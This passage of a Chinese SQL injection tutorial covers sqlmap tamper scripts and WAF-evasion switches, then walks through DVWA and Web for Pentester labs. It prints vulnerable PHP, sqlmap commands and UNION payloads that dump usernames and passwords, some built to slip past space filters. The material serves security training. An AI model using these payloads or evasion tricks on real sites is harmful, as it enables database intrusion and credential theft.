style="text-align:left">序号</th><th style="text-align:left">脚本名称</th><th style="text-align:left">注释</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">0x2char</td><td style="text-align:left">将每个编码后的字符转换为等价表达</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">apostrophemask</td><td style="text-align:left">单引号替换为Utf8字符</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">apostrophenullencode</td><td style="text-align:left">替换双引号为%00%27</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">appendnullbyte</td><td style="text-align:left">有效代码后添加%00</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">base64encode</td><td style="text-align:left">使用base64编码</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">between</td><td style="text-align:left">比较符替换为between</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left">bluecoat</td><td style="text-align:left">空格替换为随机空白字符，等号替换为like</td></tr><tr><td style="text-align:left">8</td><td style="text-align:left">chardoubleencode</td><td style="text-align:left">双url编码</td></tr><tr><td style="text-align:left">9</td><td style="text-align:left">charencode</td><td style="text-align:left">将url编码</td></tr><tr><td style="text-align:left">10</td><td style="text-align:left">charunicodeencode</td><td style="text-align:left">使用unicode编码</td></tr><tr><td style="text-align:left">11</td><td style="text-align:left">charunicodeescape</td><td style="text-align:left">以指定的payload反向编码未编码的字符</td></tr><tr><td style="text-align:left">12</td><td style="text-align:left">commalesslimit</td><td style="text-align:left">改变limit语句的写法</td></tr><tr><td style="text-align:left">13</td><td style="text-align:left">commalessmid</td><td style="text-align:left">改变mid语句的写法</td></tr><tr><td style="text-align:left">14</td><td style="text-align:left">commentbeforeparentheses</td><td style="text-align:left">在括号前加内联注释</td></tr><tr><td style="text-align:left">15</td><td style="text-align:left">concat2concatws</td><td style="text-align:left">替换CONCAT为CONCAT_WS</td></tr><tr><td style="text-align:left">16</td><td style="text-align:left">equaltolike</td><td style="text-align:left">等号替换为like</td></tr><tr><td style="text-align:left">17</td><td style="text-align:left">escapequotes</td><td style="text-align:left">双引号替换为\</td></tr><tr><td style="text-align:left">18</td><td style="text-align:left">greatest</td><td style="text-align:left">大于号替换为greatest</td></tr><tr><td style="text-align:left">19</td><td style="text-align:left">halfversionedmorekeywords</td><td style="text-align:left">在每个关键字前加注释</td></tr><tr><td style="text-align:left">20</td><td style="text-align:left">htmlencode</td><td style="text-align:left">html编码所有非字母和数字的字符</td></tr><tr><td style="text-align:left">21</td><td style="text-align:left">ifnull2casewhenisnull</td><td style="text-align:left">改变ifnull语句的写法</td></tr><tr><td style="text-align:left">22</td><td style="text-align:left">ifnull2ifisnull</td><td style="text-align:left">替换ifnull为if(isnull(A))</td></tr><tr><td style="text-align:left">23</td><td style="text-align:left">informationschemacomment</td><td style="text-align:left">标示符后添加注释</td></tr><tr><td style="text-align:left">24</td><td style="text-align:left">least</td><td style="text-align:left">替换大于号为least</td></tr><tr><td style="text-align:left">25</td><td style="text-align:left">lowercase</td><td style="text-align:left">全部替换为小写值</td></tr><tr><td style="text-align:left">26</td><td style="text-align:left">modsecurityversioned</td><td style="text-align:left">空格替换为查询版本的注释</td></tr><tr><td style="text-align:left">27</td><td style="text-align:left">modsecurityzeroversioned</td><td style="text-align:left">添加完整的查询版本的注释</td></tr><tr><td style="text-align:left">28</td><td style="text-align:left">multiplespaces</td><td style="text-align:left">添加多个空格</td></tr><tr><td style="text-align:left">29</td><td style="text-align:left">nonrecursivereplacement</td><td style="text-align:left">替换预定义的关键字</td></tr><tr><td style="text-align:left">30</td><td style="text-align:left">overlongutf8</td><td style="text-align:left">将所有字符转义为utf8</td></tr><tr><td style="text-align:left">31</td><td style="text-align:left">overlongutf8more</td><td style="text-align:left">以指定的payload转换所有字符</td></tr><tr><td style="text-align:left">32</td><td style="text-align:left">percentage</td><td style="text-align:left">每个字符前添加%</td></tr><tr><td style="text-align:left">33</td><td style="text-align:left">plus2concat</td><td style="text-align:left">将加号替换为concat函数</td></tr><tr><td style="text-align:left">34</td><td style="text-align:left">plus2fnconcat</td><td style="text-align:left">将加号替换为ODBC函数{fn CONCAT()}</td></tr><tr><td style="text-align:left">35</td><td style="text-align:left">randomcase</td><td style="text-align:left">字符大小写随机替换</td></tr><tr><td style="text-align:left">36</td><td style="text-align:left">randomcomments</td><td style="text-align:left">/**/分割关键字</td></tr><tr><td style="text-align:left">37</td><td style="text-align:left">securesphere</td><td style="text-align:left">添加某字符串</td></tr><tr><td style="text-align:left">38</td><td style="text-align:left">sp_password</td><td style="text-align:left">追加sp_password字符串</td></tr><tr><td style="text-align:left">39</td><td style="text-align:left">space2comment</td><td style="text-align:left">空格替换为/**/</td></tr><tr><td style="text-align:left">40</td><td style="text-align:left">space2dash</td><td style="text-align:left">空格替换为–加随机字符</td></tr><tr><td style="text-align:left">41</td><td style="text-align:left">space2hash</td><td style="text-align:left">空格替换为#加随机字符</td></tr><tr><td style="text-align:left">42</td><td style="text-align:left">space2morecomment</td><td style="text-align:left">空格替换为/<strong>_</strong>/</td></tr><tr><td style="text-align:left">43</td><td style="text-align:left">space2morehash</td><td style="text-align:left">空格替换为#加随机字符及换行符</td></tr><tr><td style="text-align:left">44</td><td style="text-align:left">space2mssqlblank</td><td style="text-align:left">空格替换为其他空符号</td></tr><tr><td style="text-align:left">45</td><td style="text-align:left">space2mssqlhash</td><td style="text-align:left">空格替换为%23%0A</td></tr><tr><td style="text-align:left">46</td><td style="text-align:left">space2mysqlblank</td><td style="text-align:left">空格替换为其他空白符号</td></tr><tr><td style="text-align:left">47</td><td style="text-align:left">space2mysqldash</td><td style="text-align:left">空格替换为–%0A</td></tr><tr><td style="text-align:left">48</td><td style="text-align:left">space2plus</td><td style="text-align:left">空格替换为加号</td></tr><tr><td style="text-align:left">49</td><td style="text-align:left">space2randomblank</td><td style="text-align:left">空格替换为备选字符集中的随机字符</td></tr><tr><td style="text-align:left">50</td><td style="text-align:left">symboliclogical</td><td style="text-align:left">AND和OR替换为<code>&amp;&amp;</code></td></tr><tr><td style="text-align:left">51</td><td style="text-align:left">unionalltounion</td><td style="text-align:left">union all select替换为union select</td></tr><tr><td style="text-align:left">52</td><td style="text-align:left">unmagicquotes</td><td style="text-align:left">宽字符绕过GPC</td></tr><tr><td style="text-align:left">53</td><td style="text-align:left">uppercase</td><td style="text-align:left">全部替换为大写值</td></tr><tr><td style="text-align:left">54</td><td style="text-align:left">varnish</td><td style="text-align:left">添加HTTP头</td></tr><tr><td style="text-align:left">55</td><td style="text-align:left">versionedkeywords</td><td style="text-align:left">用注释封装每个非函数的关键字</td></tr><tr><td style="text-align:left">56</td><td style="text-align:left">versionedmorekeywords</td><td style="text-align:left">使用注释绕过</td></tr><tr><td style="text-align:left">57</td><td style="text-align:left">xforwardedfor</td><td style="text-align:left">添加伪造的HTTP头</td></tr></tbody></table><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="清空会话文件"><a href="#清空会话文件" class="headerlink" title="清空会话文件"></a>清空会话文件</h3><p>选项：<code>--flush-session</code></p><p>经过上面的相关描述，相信你已经熟悉了会话文件的相关概念，值得注意的是，你可以通过选项 <code>--flush-session</code> 来清空会话文件内容。这样你可以避免 sqlmap 默认的缓存机制。也可以手动移除相关的会话文件。</p><h3 id="使用-DBMS-hex-函数获取数据"><a href="#使用-DBMS-hex-函数获取数据" class="headerlink" title="使用 DBMS hex 函数获取数据"></a>使用 DBMS hex 函数获取数据</h3><p>开关：<code>--hex</code></p><p>很多情况下，获取非 ASCII 数据都会有特殊要求。其中一个解决方案就是使用 DBMS hex 函数。开启这个开关，数据在被获取之前，会被编码成十六进制格式，并在随后被解码成原先的格式。</p><h3 id="使用-HTTP-参数污染"><a href="#使用-HTTP-参数污染" class="headerlink" title="使用 HTTP 参数污染"></a>使用 HTTP 参数污染</h3><p>开关：<code>--hpp</code></p><p>HTTP 参数污染（HPP）是一种绕过 WAF/IPS/IDS 保护机制（<a href="http://www.imperva.com/resources/glossary/http_parameter_pollution_hpp.html" target="_blank" rel="noopener">这里</a>有相关介绍）的方法，针对 ASP/IIS 和 ASP.NET/IIS 平台尤其有效。如果你怀疑目标使用了这种保护机制，可以尝试使用此开关以绕过它。</p><h3 id="针对-WAF-IPS-IDS-保护进行通过测试"><a href="#针对-WAF-IPS-IDS-保护进行通过测试" class="headerlink" title="针对 WAF/IPS/IDS 保护进行通过测试"></a>针对 WAF/IPS/IDS 保护进行通过测试</h3><p>开关：<code>--identify-waf</code></p><p>sqlmap 可以尝试识别后端 WAF/IPS/IDS 保护（如果有），以便用户可以执行适当的步骤（例如：通过选项 <code>--tamper</code> 使用篡改脚本）。目前，大约支持 30 种不同的产品（例如：Airlock，Barracuda WAF 等），可以在 <code>waf</code> 目录下找到它们对应的 WAF 脚本。</p><h3 id="伪装智能手机"><a href="#伪装智能手机" class="headerlink" title="伪装智能手机"></a>伪装智能手机</h3><p>开关：<code>--mobile</code></p><p>有时 Web 服务器向手机提供的是不同于电脑的接口。在这种情况下，你可以强制使用预定义好的智能手机 HTTP User-Agent 头部值。使用此开关，sqlmap 将询问你选择一种流行的智能手机，它将在当前运行中进行伪装。</p><p>运行示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile</span><br><span class="line">[...]</span><br><span class="line">which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[1] Apple iPhone 4s (default)</span><br><span class="line">[2] BlackBerry 9900</span><br><span class="line">[3] Google Nexus 7</span><br><span class="line">[4] HP iPAQ 6365</span><br><span class="line">[5] HTC Sensation</span><br><span class="line">[6] Nokia N97</span><br><span class="line">[7] Samsung Galaxy S</span><br><span class="line">&gt; 1</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="延时相关"><a href="#延时相关" class="headerlink" title="延时相关"></a>延时相关</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">--proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">--proxy=socks5://127.0.0.1:1086</span><br></pre></td></tr></table></figure><h1 id="DVWA-注入"><a href="#DVWA-注入" class="headerlink" title="DVWA 注入"></a>DVWA 注入</h1><h2 id="SQL-Injection-SQL-注入"><a href="#SQL-Injection-SQL-注入" class="headerlink" title="SQL Injection SQL 注入"></a>SQL Injection SQL 注入</h2><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$id = $_REQUEST[ <span class="string">'id'</span> ]</span><br><span class="line"><span class="comment"># 没有过滤就直接带入 SQL 语句中 使用单引号闭合</span></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// 回显信息</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line">        $html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因为之前输完 SQLi-Labs 靶场了，从源码中来看这里使用最基本的 Union 联合查询注入效率最高，国光这里直接丢最终注入的 Payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sqli/?id=-1&apos; union select 1,(SELECT+GROUP_CONCAT(user,&apos;:&apos;,password+SEPARATOR+0x3c62723e)+FROM+users)--+&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20200527/15905836509224.png" alt="img"></p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>和 Low 级别不一样的代码主要区别如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br></pre></td></tr></table></figure><p>可以看到从 GET 型注入变成了 POST 型注入，而且闭合方式不一样，从单引号变成直接拼接到 SQL 语句了。</p><p>POST 的数据内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)&amp;Submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20200527/1590584240851.png" alt="img"></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>主要代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br></pre></td></tr></table></figure><p>从 SESSION 获取 id 值，使用单引号拼接。因为 SESSION 获取值的特点，这里不能直接在当前页面注入，</p><p>input 的输入框内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-2&apos; union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FROM users)#</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20200527/15905847152255.png" alt="img"></p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>这个级别的主要防护代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Anti-CSRF token 防御 CSRF 攻击</span></span><br><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"><span class="comment">// 检测是否是数字类型</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">  <span class="comment">// 预编译</span></span><br><span class="line">  $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">  $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">  $data-&gt;execute();</span><br><span class="line">  $row = $data-&gt;fetch();</span><br></pre></td></tr></table></figure><p>CSRF、检测 id 是否是数字</p><p>prepare 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p><h2 id="SQL-Injection-Blind-SQL-盲注"><a href="#SQL-Injection-Blind-SQL-盲注" class="headerlink" title="SQL Injection (Blind) SQL 盲注"></a>SQL Injection (Blind) SQL 盲注</h2><p>盲注是一个比较耗时的工作，因为之前刷完靶场了，国光这里打算使用 sqlmap 演示一下点到为止，感兴趣的朋友建议去系统地刷下 SQLi-Labs 靶场。</p><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p>主要区别在这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">  <span class="comment">// 查询到结果 只输出如下信息</span></span><br><span class="line">  $html .= <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面尝试直接使用 sqlmap 进行注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#"</span> --cookie=<span class="string">"PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=low"</span> --dbms=MySQL --technique=B --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure><blockquote><p>因为 DVWA 是有登录机制的，所以这里手动指定 –cookie 来进行会话认证</p></blockquote><h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p>同理也是没有直接输出查询结果的，这里和普通的注入类似，那么这里依然还是直接使用 sqlmap 进行注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/vulnerabilities/sqli_blind/"</span> --cookie=<span class="string">"PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=medium"</span> --data=<span class="string">"id=1*&amp;Submit=Submit"</span> --dbms=MySQL --technique=B --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure><h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_COOKIE[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">$getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br></pre></td></tr></table></figure><p>这里是从 Cookie 中获取 id 然后导入到数据库中查询的，那么知道注入点之后依然可以使用 sqlmap 来进行注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/vulnerabilities/sqli_blind/"</span> --cookie=<span class="string">"id=1*; PHPSESSID=ostjqce3ggb6tvlv55sg9hs7vi; security=high"</span> --dbms=MySQL --technique=B --random-agent --flush-session -v 3</span><br></pre></td></tr></table></figure><h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><p>和上面的关卡一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入。</p><h1 id="Web-for-Pentester-SQL注入系列"><a href="#Web-for-Pentester-SQL注入系列" class="headerlink" title="Web for Pentester SQL注入系列"></a>Web for Pentester SQL注入系列</h1><h2 id="Example-1-基础注入"><a href="#Example-1-基础注入" class="headerlink" title="Example 1 基础注入"></a>Example 1 基础注入</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line">  <span class="keyword">while</span> ($row = mysql_fetch_assoc($result))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;td&gt;"</span>.$row[<span class="string">'age'</span>].<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>name=’X’</td></tr></tbody></table><p>那么就直接丢 payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example1.php?name=x&apos; union select 1,2,(SELECT+GROUP_CONCAT(name,&quot;:&quot;,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5--+</span><br></pre></td></tr></table></figure><h2 id="Example-2-过滤空格"><a href="#Example-2-过滤空格" class="headerlink" title="Example 2 过滤空格"></a>Example 2 过滤空格</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/ /'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>name=’X’</td></tr></tbody></table><p>和 Example 1 基本上一致，只是这里过滤了 空格，如果匹配到空格的话，直接就终止函数。</p><p>过滤空格可以尝试通过下面的字符来替代：</p><ul><li>%09 TAB 键（水平）</li><li>%0a 新建一行</li><li>%0c 新的一页</li><li>%0d return 功能</li><li>%0b TAB 键（垂直）</li><li>%a0 空格</li><li>/**/ 多行注释</li></ul><p>最终的 payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example2.php?name=x&apos;/**/union/**/select/**/1,2,(SELECT/**/GROUP_CONCAT(name,&quot;:&quot;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),4,5%23</span><br></pre></td></tr></table></figure><h2 id="Example-3-过滤连续空格"><a href="#Example-3-过滤连续空格" class="headerlink" title="Example 3 过滤连续空格"></a>Example 3 过滤连续空格</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/\s+/'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>where name=’X’</td></tr></tbody></table><p>来过滤一个或多个连续空格。但是，我仍然可以使用多行注释<code>/**/</code> 或者 Example 2 其他字符来 Bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example3.php?name=x&apos;/**/union/**/select/**/1,2,(SELECT/**/GROUP_CONCAT(name,&quot;:&quot;,passwd/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/users),4,5%23</span><br></pre></td></tr></table></figure><p>sqlmap 也有内置的 tamper 可以直接使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://10.211.55.20/sqli/example3.php?name=root*%23"</span> --technique=U --dbms=MySQL --tamper=<span class="string">"space2comment"</span> --random-agent --flush-session -v 3 --level=3</span><br></pre></td></tr></table></figure><h2 id="Example-4-画蛇添足的过滤"><a href="#Example-4-画蛇添足的过滤" class="headerlink" title="Example 4 画蛇添足的过滤"></a>Example 4 画蛇添足的过滤</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 直接拼接到 SQL 语句中</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql.=mysql_real_escape_string($_GET[<span class="string">"id"</span>]).<span class="string">" "</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>where id = X</td></tr></tbody></table><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符：<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，那么问题来了 这一题中并没有使用引号来闭合，所以注入的时候我们也不需要引号，所以实际上这个函数并没有发挥作用，下面正常进行注入吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example4.php?id=-2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure><h2 id="Example-5-画蛇添足的正则"><a href="#Example-5-画蛇添足的正则" class="headerlink" title="Example 5 画蛇添足的正则"></a>Example 5 画蛇添足的正则</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[0-9]+/'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>] ;</span><br><span class="line"></span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure><table><thead><tr><th>请求方式</th><th>注入类型</th><th>闭合方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td>where id = X</td></tr></tbody></table><p>参数 id 必须是数字开头，否则直接终止函数运行。不过实际手工注入的时候默认 id 是满足这个条件的，除非我们手动修改这个 id 的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example5.php?id=2 and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(name,passwd+SEPARATOR+0x3c62723e)+FROM+users),4,5</span><br></pre></td></tr></table></figure><p>这里不能用 id=-2 来构造报错了，因为正则限制 id 必须是数字开题，所以这里使用了 and 1=2 来构造报错。不过实际上这里不用构造报错也可以的，因为页面不止显示一条查询信息，但是由于注入习惯的原因，国光我这里喜欢构造报错。</p><h2 id="Example-6-画蛇添足的正则-again"><a href="#Example-6-画蛇添足的正则-again" class="headerlink" title="Example 6 画蛇添足的正则 again"></a>Example 6 画蛇添足的正则 again</h2><p><strong>关键代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[0-9]+$/'</span>, $_GET[<span class="string">"id"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ERROR INTEGER 